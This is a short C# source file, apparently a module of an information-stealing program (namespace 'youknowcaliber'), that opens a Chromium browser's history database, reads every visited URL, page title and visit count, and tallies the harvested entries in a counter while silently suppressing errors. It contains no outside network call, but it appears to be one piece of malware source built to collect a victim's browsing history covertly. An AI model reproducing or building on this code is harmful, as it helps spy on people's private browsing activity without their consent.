using System.Collections.Generic;

namespace youknowcaliber.Chromium
{
    internal sealed class History
    {
       
        public static List<Site> Get(string sHistory)
        {
            List<Site> scHistory = new List<Site>();
            try
            {
                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sHistory, "urls");
                if (sSQLite == null) return scHistory;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    Site sSite = new Site();
                    sSite.sTitle = Crypto.GetUTF8(sSQLite.GetValue(i, 1));
                    sSite.sUrl = Crypto.GetUTF8(sSQLite.GetValue(i, 2));
                    sSite.iCount = System.Convert.ToInt32(sSQLite.GetValue(i, 3)) + 1;
                    Counting.History++;
                    scHistory.Add(sSite);

                }
            }
            catch {  }
            return scHistory;
        }
    }
}
